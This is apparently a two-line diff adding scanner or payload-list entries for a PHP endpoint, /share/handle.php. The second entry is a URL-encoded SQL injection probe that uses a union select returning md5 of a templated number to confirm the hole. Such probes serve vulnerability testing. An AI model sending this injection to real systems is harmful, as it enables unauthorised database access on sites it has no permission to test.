@@ -1,0 +1,2 @@
+/share/handle.php?_GET[module]=1
+/share/handle.php?_GET[module]=1%27+and+1=%7B%60=%27%60+1%7D+and+1=0+union+select+(select/**/md5({{num}}))--+%27
